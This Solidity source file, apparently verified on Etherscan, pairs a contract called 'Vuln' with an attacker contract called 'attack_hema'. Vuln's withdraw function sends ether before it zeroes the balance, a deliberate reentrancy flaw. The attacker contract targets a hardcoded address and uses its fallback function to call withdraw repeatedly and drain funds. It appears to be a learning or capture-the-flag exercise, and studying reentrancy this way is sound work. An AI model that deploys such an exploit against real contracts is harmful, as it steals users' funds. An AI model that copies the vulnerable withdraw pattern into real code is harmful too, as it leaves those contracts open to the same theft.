/**
 *Submitted for verification at Etherscan.io on 2021-11-29
*/

pragma solidity ^0.5.0;
    
    contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

    contract attack_hema
    {
        Vuln public vuln_node  = Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018);
        uint public i=0;
  /*      function set_addr(address _to) public {
            vuln_node = Vuln(_to);
        }
*/
        function() external payable
        {
            if(i<3)
            {
                i=i+1;
                vuln_node.withdraw();
            }
        }

        function fake_deposit() public payable
        {
           // vuln_node = Vuln(_to);
            vuln_node.deposit.value(msg.value)();
            vuln_node.withdraw();
        }
        function getBalance() public view returns(uint256)
        {
            return vuln_node.balances(address(this));
        }
    }